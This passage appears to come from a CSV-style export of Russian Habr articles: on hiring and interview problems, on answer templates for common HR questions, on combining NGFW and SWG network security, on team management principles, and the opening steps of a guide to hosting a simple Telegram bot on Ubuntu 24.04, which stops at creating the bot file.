Активно используются нейросети и другие технологии для помощи в прохождении собеседований, что вынуждает компании усложнять этапы и задавать более глубокие вопросы.
Теперь подробнее разберем ключевые проблемы собеседований, с которыми я так или иначе сталкивался сам за последнее время.
HR не отвечает не потому что плохой, а потому что захлебывается
Главная причина молчания — огромное количество откликов. Представьте, что на одну вакансию за пару дней откликается 500+ кандидатов. Если компания ищет джуна, то может быть и более 1000 откликов за один день, особенно если условия вакансии привлекательные. HR не способен качественно обработать каждый отклик.
Добавим к этому модную сейчас практику оформлять резюме на английском. С одной стороны, в этом нет ничего категорически плохого. С другой стороны, ты изучил резюме на русском, потом на английском, потом несколько на русском, потом на английском, а потом из ушей стремительно начинает вырываться пар. Как вы понимаете, скорости обработки откликов это не добавляет. Даже если резюме классное, HR может его не заметить — просто потому, что физически не успевает обработать поток.
Если же найм происходит не через централизованную платформу типа hh, то смело можно применять попарное тестирование:
Формат резюме: xls, doc, pdf
Объем: от 1 страницы до 5
Язык: русский/английский
Наличие или отсутствие интересующих HR блоков: общий опыт работы, гражданство, текущее место жительства, ключевые навыки, желаемая зп
Сортировка опыта работы: от последних мест к старым или наоборот
Оформление: с финтифлюшками, строгий формат, индивидуальный подход
Такое разнообразие совсем не помогает быстро и качественно отбирать резюме.
Тестовые задания: работа или проверка?
Споры вокруг оплаты тестовых заданий идут уже давно. Соискатели справедливо замечают, что тратят свое личное время и хотят компенсации. Наниматели же парируют: тестовые задания — это не работа, а инструмент проверки навыков.
Не буду надолго останавливаться на этом пункте, так как моя позиция довольно простая. Если тестовое задание:
Реальная задача компании, которая пойдет в продакшн или принесет явную пользу компании — оплата обязательна. Иначе для соискателя это неоплачиваемый труд.
Специально созданная задача для оценки навыков (кейсы, баги, чек-листы, автотесты) — компания не получает никакой реальной выгоды, поэтому требовать компенсацию за выполнение этого задания было бы странно.
У нас в KTS есть тестовое задание для QA, мы его сделали специально для одного из этапов собеседований. На вопрос “а мне за это заплатят?” я сразу отвечаю “нет”: таким образом отсеиваются кандидаты, которые воспринимают любое задание как попытку эксплуатации.
Многоэтапные собеседования — это защита, а не издевка
Количество этапов собеседования выросло не потому, что компаниям так захотелось или hr нечего делать, а по необходимости. Кандидаты стали намного лучше готовиться к интервью, есть сервисы и курсы, которые буквально учат проходить собеседования. Работодателям необходимо отличать умение красиво рассказывать от реальных скилов.
Типичная многоступенчатая структура выглядит так:
Скрининг резюме (от HR или нейросети).
HR-звонок (общие вопросы, soft skills).
Технический скрининг (краткие вопросы, теория).
Практическое задание или кейс (проверка реальных навыков).
Техническое интервью (углубленная проверка навыков).
Финальный этап (знакомство с командой и руководством).
Раньше действительно все было проще и быстрее. Получить оффер за две недели с подачи отклика, пройдя два этапа собесов, было вполне нормальной ситуацией. Сейчас же, с учетом отличной подготовки кандидатов к собеседованиям, у компаний есть только два варианта:
Переносить часть этапов на испытательный срок. В таком случае в компании будет довольно большая текучка среди новичков, и не все работодатели к такому готовы. Кандидатам тоже будет не особо приятно снова оказаться на рынке труда после пары месяцев работы, на которую они устроились относительно легко.
Усложнять собесы и увеличивать количество этапов. В таком случае страдают не только кандидаты, компания тоже тратит много сил и времени на поиск подходящего сотрудника.
Да, всем хочется пройти два этапа и получить оффер. Но 2025 год — это не 2015. Сейчас интервью — это уже не просто фильтр, а многоступенчатая защита от ошибок найма.
Читерство, микронаушники и использование нейронок
С развитием технологий соискатели все чаще используют подсказки на интервью, начиная от банального гугления на скринингах и заканчивая подсказками через наушники и запросами к нейросетям прямо во время интервью. Кто-то не поверит, но, к сожалению, я сам часто с таким сталкиваюсь на тех этапах, где хотя бы в теории кандидатам может помочь гугление.
Было много случаев, когда после моего вопроса я слышу характерные щелчки механической клавиатуры, вижу, что лицо человека освещается белым сиянием фона странички гугла, а глаза бегают по строкам в поисках нужного ответа. Естественно, кандидат в этот момент молчит или тянет время фразами: “ну… как бы это своими словами объяснить”, а потом выдает красивейшее определение из вики, которое, к сожалению, не особо связано с заданным мной вопросом.
Почему это неэффективно?
Опытный интервьюер всегда отличит реальный ответ кандидата от заготовленного или нагугленного. Если вы до сих пор думаете, что учителя и преподаватели не видели, как вы списывали и подглядывали на экзаменах и контрольных, то срочно передумывайте обратно. Все видно.
Если кандидату все же удалось «проскочить» этап с гуглом, то некомпетентность быстро вскроется на следующих этапах или на испытательном сроке.
Вероятно, у читателя может возникнуть закономерное возражение: на работе-то мы постоянно гуглим, невозможно знать все, и это нормально. Полностью с этим согласен, но есть два важных момента:
Гугление, микронаушники, помощь друга/зала на собесе — это обман. Наниматель ожидает увидеть и услышать знания кандидата на собесе, а не вкачанную в 100+ ловкость.
Вопросы должны соответствовать вакансии. Если компания ищет ручного тестировщика на фронт, то не надо его мучать вопросами по SQL или модели OSI, а лучше спросить про структуру сайта, dom, макеты. В ситуации с читерством отчасти виноваты и компании, которые халатно составляют вопросы для собесов, и кандидаты перестают верить в возможность честно к ним подготовиться.
Таро, гороскопы и прочая псевдонаука
Иногда компании используют не совсем привычные методы оценки, вроде анализа натальных карт, раскладов таро, соответствие знаков гороскопа или чего-то подобного. Казалось бы, чем бы дитя не тешилось, но не все так просто.
У такого подхода есть огромный минус и ни одного плюса. Компания полагается на мистику (а по факту, тыкает пальцем в небо) вместо рационального подхода к оценке навыков. Чем это плохо для компании: риск найма некомпетентных сотрудников и отказы действительно клевым кандидатам, у которых месяц рождения в доме Нептуна. 
Для самих кандидатов такой подход — это тоже весьма серьезный повод задуматься. Если вы прошли испытание гороскопом — поздравляю. Дальше, возможно, будут корпоративные жертвоприношения. Но не факт.
А камеру включать обязательно?
Если кратко, то да, обязательно. Где-то начиная с ковида собесы массово перешли в онлайн, и наниматели потеряли возможность смотреть на кандидатов в реальной жизни. Несмотря на то, что ковид уже давно прошел, почти все собесы сейчас продолжают проходить онлайн в зуме, мите, тележке и прочих аналогичных сервисах.
Оценивать кандидата по невербальному общению в таких условиях довольно тяжело, остается только 2D-картинка. Если же и камеру убрать, то вместо живых людей останутся только голоса. Мне как нанимателю все же важно видеть лицо человека, которого я принимаю в компанию. Также и кандидату должно быть интересно, кто будет его руководителем и с кем ему в дальнейшем работать. Игнорировать этот момент — все равно что прийти на оффлайн-собес в шапке-невидимке.
Чек-лист для соискателя: как не вылететь с первой минуты
Четкое, релевантное резюме, без ‭«трудолюбивый и пунктуальный».
Будьте честны, даже если правда не глянцевая.
Готовьтесь заранее. Импровизация — это не синоним профессионализма.
Задавайте вопросы сами, лучше с подготовленным списком.
Регулярно поддерживайте актуальность знаний и стека.
Составьте себе чек-лист «грин флагов» и «ред флагов», он поможет сделать выбор быстрее, чем десяток офферов.
Чек-лист для нанимателя: найм — это тоже диалог
Будьте прозрачны и понятны, честно и однозначно объясняйте кандидатам этапы и сроки.
Давайте обратную связь. Даже короткий, но справедливый фидбек формирует положительный имидж компании.
Регулярно пересматривайте и улучшайте процесс отбора, адаптируйтесь под изменения рынка.
Надеюсь, эта статья поможет обеим сторонам баррикад лучше понять, что по ту сторону тоже находятся реальные люди. Если и не удастся упростить всё, то хотя бы получится начать разговаривать, а не стрелять вопросами и молчанием.
А напоследок предлагаю почитать статьи моих коллег о тестировании — там вы найдете и общие рекомендации, и практические кейсы. Чем больше знаешь, тем проще собеседоваться:
Все, что нужно знать менеджеру о QA
Next.js + Playwright. Как мы начали писать автотесты и что из этого вышло
Удачных поисков и собеседований!"
"«Кем Вы видите себя через 5 лет», или HRско-русский разговорник",https://habr.com/ru/companies/sibur_official/articles/899720/,"Вас спрашивали «Кем Вы видите себя через 5 лет»? Меня тоже. За двадцать пять лет в IT я понял, зачем они так делают. Понял – это значит, что я «привык и научился пользоваться» (С). Но «неприятно удивл...","Вас спрашивали «Кем Вы видите себя через 5 лет»? Меня тоже. За двадцать пять лет в IT я понял, зачем они так делают. Понял – это значит, что я «привык и научился пользоваться» (С). Но «неприятно удивлять» они меня не перестали.
Публикую свой личный русско-HRский разговорник. Он вряд ли поменяет ваше отношение к HRскому языку, но проходить собеседования вы будете проще и эффективнее.
Дисклеймер
Я не призываю врать или «играть по правилам» HR. Я делюсь практической схемой подачи опыта и скиллов, чтобы минимизировать отказы «по софтам». В моем случае она работает.
Разговорник устроен так:
Вопрос.
Похожие вопросы: разные по форме, но схожие по сути.
Перевод: что на самом деле хотят узнать.
Мысли: спрятанный под спойлер анализ.
Ответ: шаблон плюс пример.
Если времени мало, читайте только вопросы и ответы.
Вопросы отсортировал по убыванию «неприятного удивления». Задают их, конечно, в другом порядке.
Почему вы выбрали именно нашу компанию?
Кольцо выбирает нового хранителя: Смеагола. Кадр из фильма «Властелин колец»
Похожие вопросы:
Почему вы хотите получить эту работу?
Что вы знаете о нас?
Чем наша компания выделяется для вас среди других?
Перевод
Покажи, что ты хочешь именно к нам. Случайные люди тут не нужны. Ведь мы почти как FAANG. Продемонстрируй умение гуглить мотивацию.
Мысли
Ответ
Шаблон:
Ваша компания – эксперт в [отрасли]. Вы производите [продукцию], которая [комплименты с их сайта]. И вы превосходите конкурентов в [преимущество с сайта]. Именно поэтому меня заинтересовала ваша вакансия.
Если не хотите пересказывать сайт:
Я изучил ваш сайт и другие открытые источники. Мне понравилось то, что вы делаете. Но сайт ориентирован на клиентов. Вы не могли бы рассказать о вашей компании не для клиента, а для будущего сотрудника?
Кем Вы видите себя через 5 лет?
Галадриэль показывает Фродо в зеркале возможное будущее. Кадр из фильма  «Властелин колец»
Похожие вопросы:
Какие у вас карьерные цели?
Что для вас значит успех в работе?
Что для вас означает «рост»?
Перевод
Убеди, что ты к нам надолго. Покажи, что твой трек развития подходит для этой позиции.
Мысли
Ответ
Я вижу себя специалистом, который нарастил профессиональную экспертизу. Я смогу еще лучше выполнять работу и брать на себя расширенный набор обязанностей. Поделитесь, какие у вас планы относительно открытой позиции? Это поможет мне более точно ответить на вопрос.
Далее слушаете, что для них важно. Решаете, подходит ли это вам. Дополняете ответ.
Какие ваши слабые стороны?
Голлум. Кадр из фильма  «Властелин колец»
Похожие вопросы:
Какую критику вы получали чаще всего?
Что бы вы хотели улучшить в себе?
Перевод
Мы тебя совсем не знаем. Расскажи о себе то, что мы никак не узнаем из других источников. На основании сказанного мы избавляемся от токсиков, врунов и лузеров.
Мысли
Ответ
Шаблон:
Я обладаю [вот таким социально одобряемым качеством].
Однако это может [приводить к плохим последствиям].
Тогда я устраняю последствия [вот таким способом].
Пример:
Я – тимлид, я сфокусирован на командных целях и делаю ровно то, что нужно бизнесу.
Но я не всегда вижу новые возможности, у меня нет предпринимательской жилки.
Поэтому я люблю работать в тандеме с сильным владельцем продукта. Он обеспечивают поток гипотез, я помогаю их проверить и, при необходимости, реализовать.
Расскажите про вашу самую большую неудачу
Голлум падает в жерло Ородруина. Кадр из фильма  «Властелин колец»
Похожие вопросы:
Подводили ли вы команду или клиента?
Был ли у вас проект, который пошёл не по плану?
Что вы делаете, когда не справляетесь?
Перевод
Покажи, как справляешься с неудачами? Кого обвиняешь в неудачах? Способен ли извлечь из них урок?
Мысли
Ответ
Шаблон: по STAR/AR:
Situation. Какая была ситуация?
Task. Как поставили задачу?
Action. Что сделано?
Results. Что получилось, и почему это вас не устроило?
Alternative Action. Что и как было переделано?
Alternative Results. Что хорошего получилось после переделок?
Пример:
S. Меня назначили тимлидом в команду, которая работала над критически важным продуктом.
T. Требовалось:
погрузиться в дела
сфокусировать команду на целях
увеличить эффективность работы
повысить прозрачность
A. Я изучил дела, понял, что и как надо улучшить. Согласовал дорожную карту изменений. Начал внедрять улучшения.
R. Команда мне не доверяла. Разработчики с неформальным лидером (архитектором) оспаривали все мои решения. Целей я не достиг.
A. Я стал уделять больше времени людям. Выявил их потребности и опасения. Убедил архитектора, что не претендую на его зону влияния. Наоборот, даю ему карт-бланш на технические решения, а сам фокусируюсь на управлении. Вместе мы придумали план изменений, а затем воплотили его по модели ADKAR. А еще я стал регулярно сверяться с бизнесом по целям, а не заметать проблемы под ковер.
R. Я подружился с неформальным лидером. Мы прекрасно друг друга дополнили. Мы повысили продуктивность: пропускная способность увеличилась на 20%. И предсказуемость: мы [почти] всегда релизили то, что обещали.
Какие ваши сильные стороны?
Гендальф Белый. Кадр из фильма  «Властелин колец»
Похожие вопросы:
Почему мы должны нанять именно вас?
Что вы можете сделать для нас, чего не могут другие кандидаты?
В каких вопросах вы разбираетесь лучше других?
Перевод
Расскажи, что умеешь. Мы сверимся с нашими скрытыми требованиями. Если наше понимание о сильных сторонах расходится с твоим – «следующий»!
А еще подумаем: все, что не попало в рассказ, ты делаешь хуже.
Мысли
Ответ
Шаблон:
Мои сильные стороны:
[топ-1 требование из вакансии].
[топ-2 требование].
И [топ-3 требование].
Например: [история успеха]
Для истории подойдет шаблон STAR. Он проще чем STAR/AR, потому что нет альтернативного действия.
Пример:
Допустим, от вас требуют:
Способности читать чужой код.
Умения писать высоконагруженный код.
Умения найти общий язык с бизнесом.
Скомпилируем ответ:
Мои сильные стороны: (1) я умею разбираться в легаси-системах. (2) Люблю оптимизировать код, (3) и эти оптимизации обычно помогают бизнесу зарабатывать.
Например, S. Мы разрабатывали систему для здравоохранения Азербайджана, Грузии, Армении. У нас появился заказчик из Таиланда.
T. Система должна была держать возросшую в десять раз нагрузку.
A. Мы с владельцем продукта определили проблемные зоны, а затем я выполнил оптимизацию узких мест в C# и SQL коде.
R. Нам удалось на порядок ускорить ключевые операции и успешно пройти нагрузочное тестирование. Мы выиграли тендер на поставку системы в Таиланд.
Расскажите о себе
Фродо перед Советом Братства. Кадр из фильма  «Властелин колец»
Обычно этот вопрос задают первым.
Перевод
Расскажи то, что мы только что прочитали в резюме. Мы оценим твою способность выделять главное, держать фокус. Проверим, насколько «химия совпала».
Еще этот вопрос может «растопить лёд». Но это не точно.
Мысли
Ответ
Шаблон:
Введение. Кто вы и что делаете. Служит для задания контекста.
Кейсы. Рассказ об 1-3 кейсах из вашего опыта в кратком формате STAR без T
S. Как было до вас
A. Что вы сделали
R. Что получил бизнес. Желательно, с метриками.
Вывод. Как ваш опыт привел к [имя их компании]
Пример:
Введение. Я – разработчик с пятнадцатью годами опыта. Начинал с ассемблера под однокристаллки, потом перешёл на С++, затем – C#. Последние пять лет я – бэкэнд разработчик на .NET для корпоративного сектора.
Кейс 1.
S. Мой последний проект – система риск-менеджмента клиентов. Вначале система тормозила, потребляла лишние ресурсы и имела небольшой запас прочности. Это мешало бизнесу расти.
A. Я оптимизировал систему: снизил потребление памяти на треть и повысил быстродействие в два раза. А также повысил отказоустойчивость.
R. Это убрало стоп-фактор для роста количества клиентов. А еще бизнес получает данные по рискам вдвое быстрее.
Вывод. Я ищу возможность строить надежные и масштабируемые системы. Поэтому меня и привлекла ваша вакансия.
Деталей минимум, зацепок – максимум. Чтобы интервьюер захотел спросить: что такое риск-менеджмент? Какая архитектура? Как оптимизировал?
Почему вы решили поменять работу
Эльфы покидают Средиземье. Кадр из фильма  «Властелин колец»
Похожие вопросы:
Чем вам не нравился ваш начальник?
Почему вы ищете новые возможности?
Что бы вы изменили на вашем последнем месте работы?
Перевод
Мы верим, что прошлое поведение диктует будущее. Мы хотим выявить конфликтность и токсичность в прошлом и экстраполировать.
Мысли
Ответ
Шаблон:
[Короткое резюме достижений]
[Понятная уважительная причина]
[Связка с будущим работодателем]
Пример:
Я давно работаю над продуктом, он успешен и приносит деньги.
К сожалению, развитие сокращается, остается по большей части поддержка. Поддержка тоже важна, но я хотел бы профессионального роста. Мне интересно участвовать в дизайне IT-решений и получать соразмерную моему вкладу компенсацию.
Поэтому я вышел на рынок, и мне понравилась ваша вакансия.
Итоги
Мне кажется, я озвучил 80% бесящих вопросов и их вариаций.
Однако критерий «бесявости» – субъективен. Если вы сталкивались с вопросами, которые вас бесят еще больше – поделитесь в комментариях. Возможно, на них тоже найдется свой шаблон ответа."
"NGFW и SWG: вместе, а не вместо",https://habr.com/ru/companies/solarsecurity/articles/910058/,"В современном мире киберугрозы становятся все более изощренными, поэтому сетевой периметр организации требует все больше внимания. Многие компании привыкли выстраивать защиту с помощью продвинутых меж...","В современном мире киберугрозы становятся все более изощренными, поэтому сетевой периметр организации требует все больше внимания. Многие компании привыкли выстраивать защиту с помощью продвинутых межсетевых экранов нового поколения (next generation firewall, NGFW). Такие решения действительно обеспечивают широкий спектр функций: от фильтрации сетевых пакетов до предотвращения вторжений. Однако на практике NGFW не всегда оптимален и эффективен для борьбы с угрозами, скрытыми в легитимном веб-трафике. В этой колонке я – Анастасия Хвещеник, руководитель продукта Solar webProxy ГК «Солар, – хочу поговорить о работе с веб-трафиком — области, где возможности NGFW лучше всего дополнить с помощью системы класса SWG (Secure Web Gateway).
Какова разница между NGFW и SWG
Оба типа решений предназначены для фильтрации и мониторинга сетевого трафика, но они работают на разных уровнях сетевого взаимодействия, обрабатывая различные сущности, а потому применяются в разных сценариях. NGFW, выполняя фильтрацию сетевых пакетов, сочетает в себе традиционные возможности межсетевого экрана (фильтрация трафика по IP-адресам, портам и протоколам) с дополнительными опциями: глубокой проверкой пакетов (DPI), предотвращением вторжений (IPS), анализом трафика. В результате компания может анализировать входящий и исходящий трафик, обнаруживать аномалии и блокировать потенциальные атаки: активность вредоносное ПО, применение эксплойтов, попытки несанкционированного доступа.
SWG в свою очередь обрабатывает запросы и ответы пользователей и действует как промежуточный сервер между пользователями и веб-ресурсами, обеспечивая фильтрацию HTTP(S)-трафика, контроль доступа к сайтам, защиту от вредоносных ресурсов и предотвращение утечек данных. Основное назначение SWG — обеспечение контролируемого и безопасного доступа сотрудников к интернет-ресурсам. Благодаря высокой степени детализации политик, система позволяет управлять доступом на глубоком уровне: с учетом категорий и конкретных URL, типов контента, времени, устройств и других параметров. Такой гранулярный подход обеспечивает не просто фильтрацию, а точное соответствие требованиям безопасности, включая предотвращение утечек данных и блокировка фишинговых атак.
В сегодняшних условиях возможности SWG выходят на первый план — с эволюцией ландшафта киберугроз все больше рисков связано с активностью веб-приложений и интернет-контентом. Злоумышленники научились маскировать свои действия в легитимном веб-трафике, активно применяют фишинг и социальную инженерию. По отраслевым данным, доля зашифрованного веб-трафика в общем объеме уже превышает 70%: такой масштаб требует дополнительных инструментов контроля и безопасности, чтобы избежать проникновения ВПО в инфраструктуру таким способом, устранить риски утечек или злонамеренных инсайдерских действий.
Предоставлено ГК ""Солар""
Нагружать NGFW задачами глубокого анализа веб-трафика зачастую неэффективно, поскольку это может значительно нагрузить ресурсы системы. В результате организации рискуют столкнуться с с рисками финансовых и репутационных потерь, связанные с возможными инцидентами безопасности и заражением инфраструктуры, что может негативно сказаться на бизнес-процессах.
Именно поэтому Gartner называет SWG обязательной частью комплексной архитектуры безопасности. Эти системы проверяют и блокируют нежелательный контент еще до того, как он попадает к пользователю, и автоматически регулирует доступ к веб-ресурсам согласно корпоративным политикам.
Как SWG дополняет NGFW
Главный вклад SWG в корпоративную безопасность — это возможность продвинутой интернет-фильтрации и гибкая настройка интернет-доступа для пользователей с различными способами подключения, будь то обычные офисные сотрудники, работающие за ПК или ноутбуками, либо удаленный персонал, мобильные пользователи, сотрудники, работающие с личных устройств и т.п.
По данным исследований, у современного SWG должны быть следующие возможности:
Продвинутая веб-фильтрация: анализ и проксирование веб-трафика HTTP(S), FTP(S) и SOCKS, глубокий анализ веб-страниц, включая динамические и зашифрованные, категоризация веб-контента, инспекция зашифрованного трафика без снижения производительности и с поддержкой динамических исключений для чувствительных сервисов (например, банковских приложений).
Встроенные механизмы безопасности: проверка и блокировка файлов в трафике по разным параметрам, интеграция с DLP, антивирусами и песочницами, блокировка фишинговых ресурсов, С2С и других вредоносных ресурсов (URL, домены и IP).
Профилирование пользователей: гибкие политики доступа к веб-ресурсам по конкретным URL, IP-адресам, категориям, репутации и контенту, контроль доступа по геолокации, устройству и времени суток, поддержка удаленных пользователей, в том числе при работе с собственных устройств.
Аналитика и расследование инцидентов: сбор, хранение и анализ логов, взаимодействие с платформами киберразведки для регулярного получения данных об актуальных угрозах (IoCs), удобная отчетность с визуализацией данных.
Архитектура SWG-решения на примере Solar webProxy    
По этому списку видно, что SWG может существенно сократить нагрузку на NGFW, забирая на себя задачу инспекции зашифрованного пользовательского трафика и его детальной проверки. Однако еще важнее тот факт, что при совместном использовании NGFW и SWG дополняют друг друга, позволяя компании добиваться качественно нового уровня защищенности.
Как NGFW и SWG обеспечивают синергию
Объединение функций SWG и NGFW в рамках единой архитектуры безопасности дает компании максимальный уровень контроля над трафиком. В такой архитектуре NGFW обеспечивает фильтрацию сетевых пакетов и рассматривает угрозы сетевого уровня, а SWG обеспечивает фильтрацию запросов и ответов, выявляя угрозы именно в них. Разделение контроля пользовательского трафика позволяет более эффективно использовать NGFW для решения задач поиска угроз на сетевом уровне, отдавая противодействие атакам на уровне приложений (L7 по модели OSI), а также детальное логирование событий, связанных с доступом пользователей в Интернет, на откуп SWG.
Компания может не просто блокировать сетевую активность, но и изучать, чем интересуются и занимаются в интернете сотрудники, а также анализируя, какие данные пытаются публиковать вовне. Традиционно для подобных целей используются DLP-системы, однако они ограничивают обзор внутренней сетью, в то время как SWG предоставляет дополнительную информацию для создания полной картины.
Возможности и ограничения NGFW и SWG
SWG располагается за межсетевым экраном в DMZ. Веб-трафик пользователей и приложений посредством прокси направляется на SWG, откуда поступает на межсетевой экран.  После проверки трафика SWG, разрешенный трафик может маршрутизироваться на NGFW и проходить по сокращенному набору правил политики, разгружая NGFW от непрофильных проверок и при этом высвобождая ресурсы для анализа наличия сетевых атак и аномалий.
Фильтрующие сервера SWG можно масштабировать горизонтально, добавляя новые узлы с помощью балансировщиков нагрузки. Это позволяет распределять трафик между инстансами и повышать отказоустойчивость. Система класса SWG позволяет существенно снизить затраты на фильтрацию трафика при выходе пользователей в интернет. Это достигается за счёт того, что такие решения, как правило, поставляются в виртуальном исполнении и ориентированы на решение более узкого круга задач. В результате для целей обеспечения безопасного доступа в интернет SWG становится более доступной альтернативой по сравнению с NGFW.
Архитектура безопасности при совместном использовании NGFW и SWG    
При совместном использовании SWG и NGFW задачи распределяются оптимально: SWG обрабатывает веб-трафик, освобождая NGFW для защиты сетевого периметра. Это не только повышает эффективность каждого компонента, но и делает инфраструктуру более экономически выгодной, обеспечивая максимальную отдачу от инвестиций в безопасность.
Заключение
Напоследок рассмотрим выбор, с которыми сталкиваются многие компании: внедрять выделенный SWG или использовать нативные функции NGFW, которые зачастую включают опции веб-прокси.
По опыту очевидно, что специализированный инструмент всегда справляется с задачей лучше, чем решение-комбайн. Если забрать часть ресурсов NGFW на контроль действий пользователей, ему не хватит мощностей для контроля сетевых пакетов. Это сразу скажется на производительности корпоративных интернет-каналов.
На графике ниже — приближенные к реальным данные одной компании, которая столкнулась с такой ситуацией. После запуска NGFW скорость выхода в интернет планомерно снижалась с ростом атак на инфраструктуру. Решению не хватало ресурсов, чтобы качественно выполнять все функции, и это быстро почувствовали сотрудники.
Как рост кибератак влияет на пропускную способность прокси-сервера
При использовании выделенного SWG такая динамика не наблюдается — скорость интернет-доступа остается стабильной вне зависимости от объема атак. В этой архитектуре SWG позволяет отслеживать действия пользователей, в то время как NGFW может эффективно отражать атаки на сетевую инфраструктуру. А если потребуется  масштабирование, реализовать его с помощью SWG проще, тогда как масштабирование NGFW, как правило, требует внедрения дополнительных аппаратных ресурсов и продуманной настройки маршрутизации."
Как эффективно организовать работу команды: 5 принципов на практике,https://habr.com/ru/articles/910072/,"Прежде чем говорить об эффективности, давайте разберёмся, чем команда отличается от просто группы людей. Главное отличие — наличие общей цели. Без неё участники теряют фокус, не понимают, куда двигать...","Прежде чем говорить об эффективности, давайте разберёмся, чем команда отличается от просто группы людей. Главное отличие — наличие общей цели. Без неё участники теряют фокус, не понимают, куда двигаться, и как соотносить свои действия с задачами других.
Чтобы удерживать фокус на цели, команде нужен лидер. Он направляет, помогает определять приоритеты и формирует культуру взаимодействия. Через ценности и доверие возникает настоящая командная динамика — та самая основа для продуктивной и быстрой работы.
На основе собственного опыта я выделила 5 ключевых принципов, которые помогают выстраивать эффективную работу digital-команды.
1. Начинайте с кик-оффа
Кик-офф — это стартовая встреча, на которой собираются все участники проекта: команда, стейкхолдеры, эксперты. Это не просто формальность. Это важный ритуал запуска.
Что нужно обсудить на кик-оффе:
бизнес-цель проекта;
образ желаемого результата;
ключевые этапы и вехи;
роли и зоны ответственности.
Важно уделить время знакомству. Кто-то в компании месяц, кто-то — три года. Но все должны понимать, кто за что отвечает и к кому можно обратиться за поддержкой. Это снижает барьеры и ускоряет коммуникацию в будущем.
2. Прозрачность и безопасность
Прозрачный процесс — залог доверия и уверенности в проекте. В нашей практике (например, в Alfa up) мы ведём страницу проекта в Confluence: туда попадают шаблоны, артефакты, кейсы предыдущих запусков. У каждого участника есть доступ к графику, бизнес-целям, текущему статусу.
Вторая важная вещь — психологическая безопасность. У нас действует принцип: «Ошибаться можно». Без этого невозможно создавать новое. Только в безопасной среде люди готовы высказывать идеи, предлагать гипотезы и брать на себя инициативу.
3. Регулярные one-to-one
Коммуникация с лидером команды — не формальность, а инструмент синхронизации и профилактики рисков.
One-to-one с лидером команды: 15 минут в неделю. Обсуждаем статус, приоритеты, риски, точки напряжения.
Встреча со стейкхолдером (например, CJO): раз в месяц. Это helicopter view — краткий апдейт по проекту и ключевым метрикам.
Важно понимать: у лидеров часто несколько проектов, они не могут быть глубоко вовлечены в каждый. Поэтому ваша задача — структурировать информацию и донести её чётко и кратко.
4. Подключайте экспертов вовремя
На каждом этапе проекта нужны разные роли. Например:
дизайнер — на этапе создания прототипа;
маркетолог — на этапе подготовки текста для клиентской рассылки.
Не стоит ожидать, что эксперты сами вспомнят, когда им нужно подключиться. Напоминайте напрямую: пишите, звоните, подчеркивайте важность их участия, формулируйте задачу чётко. Например: «Посмотри, пожалуйста, текст и предложи корректировки с точки зрения позиционирования».
5. Конфликты — это нормально
Конфликты в команде — неизбежны. Разные мнения, стили работы и приоритеты — это часть любой совместной деятельности. Главное — не избегать, а уметь конструктивно разруливать.
Что помогает:
прояснять ситуацию сразу, не откладывая;
слушать друг друга без обвинений;
признавать свои ошибки, если они были;
фокусироваться не на прошлом, а на вопросе:
«Что мы можем сделать, чтобы двигаться дальше и завершить проект вовремя?»
Конфликты — не сбой, а точка роста, если с ними работать открыто и уважительно.
Надеюсь данные принципы помогут вам в работе и вы будете выстраивать ваше взаимодействие еще более эффективно!"
База: как разместить простого Telegram-бота на Ubuntu 24.04,https://habr.com/ru/companies/pqhosting/articles/910064/,"Всем привет! На связи Игорь из PQ.Hosting.
Хочу поделиться с вами одним наблюдением. Я довольно часто попадаю в такую ситуацию, когда ищу какую-нибудь базовую инструкцию и натыкаюсь на такие гайды, в ...","Всем привет! На связи Игорь из PQ.Hosting.
Хочу поделиться с вами одним наблюдением. Я довольно часто попадаю в такую ситуацию, когда ищу какую-нибудь базовую инструкцию и натыкаюсь на такие гайды, в которых явно чего-то не хватает. Один шаг пропущен, другой описан слишком вскользь, как будто это и так всем должно быть понятно. В итоге попытки следовать такой инструкции превращаются в сплошные боли и страдания. 
Мы с командой решили исправить это хотя бы в нашей сфере хостинга и серверов. С сегодняшнего дня запускаем рубрику «База», в которой будем максимально понятно и подробно объяснять то, о чём вы, возможно, стеснялись спросить.
Первый выпуск посвятим очень прикладной теме: размещению Telegram-бота на виртуальном сервере. Для примера я задеплою самый простой бот, который умеет только здороваться. Однако по этому гайду вы сможете развернуть и более сложные проекты.
Поехали!
Этап 1: подготовка сервера
Для начала нужно будет немного подготовить нашу VPS к установке бота. Кстати, для этого я по традиции буду использовать сервер от PQ.Hosting. Если захотите арендовать производительную и надежную машину, то обязательно переходите на сайт и выбирайте подходящий тариф. И не забудьте использовать промокод HABR — по нему вы получите скидку 15% на заказ виртуальногго сервера. 
Шаг 1. Обновление системы. Лучше, чтобы перед установкой все пакеты были свежими. Поэтому подключаемся к VPS по SSH и обновляемся: 
sudo apt update && sudo apt upgrade
Шаг 2. Создание пользователя для бота. Это нужно для безопасности — сидеть из под рута не самая лучшая затея. А с отдельным юзером мы сможем работать более изолировано. Не будем лишний раз креативить и для понятности назовем его botuser:
sudo adduser botuser
После выполнения команды вам предложит создать отдельный пароль для пользователя, а также внести дополнительную информацию. Ее можно оставить пустой — просто нажимаете Enter. 
Шаг 3. Установка Python 3 и pip. Свежая версия Ubuntu поставляется с Python 3. Вы можете проверить установленную версию «питона» с помощью команды: 
python3 --version. 
Но есть важный момент: в Ubuntu 24.04 (а также и в некоторых других дистрах с Python 3.12 и новее) не получится устанавливать необходимые библиотеки через менеджер pip в системный Python. Все этого сделано для того, чтобы не было конфликтов с пакетами из apt. Но ничего страшного: все это решается установкой через виртуальное окружение: 
sudo apt install -y python3 python3-pip python3-venv
Шаг 4. Заходим под пользователем — в моем случае это botuser. Но если вы использовали другое имя, то вставьте его: 
 sudo -iu botuser
Шаг 5. Создание и активация виртуального окружения. Для этого потребуется выполнить две команды: 
python3 -m venv ~/telegram-bot-venv
source ~/telegram-bot-venv/bin/activate
Шаг 6. Установка библиотеки. Здесь я использую самую популярную либу python-telegram-bot, но вы также можете установить Aiogram — на шаги деплоя этот выбор не повлияет. 
pip install python-telegram-bot
На этом этапе система готова. Поэтому немного отвлечемся от терминала и перейдем в Telegram. 
Этап 2: создание и деплой бота
Шаг 1. Получение токена Bot API. Для этого нам понадобится официальный бот BotFather — его можно найти по этой ссылке. Перейдите по ней, нажмите Start, выберите команду /newbot и следуйте дальнейшим инструкциям.
В итоге вы должны получить сообщение примерно такого вида, в котором будет содержаться API-токен.  
Шаг 2. Размещение бота на сервере. Снова возвращаемся в терминал и создаем отдельную папку для бота — так удобнее будет работать. 
mkdir -p /home/botuser/telegram-bot
После переходим в нее
cd /home/botuser/telegram-bot
Далее создаем файл bot.py. Я использую для таких задач nano — люблю минимализм :) Но вы можете использовать любой консольный текстовый редактор
nano bot.py
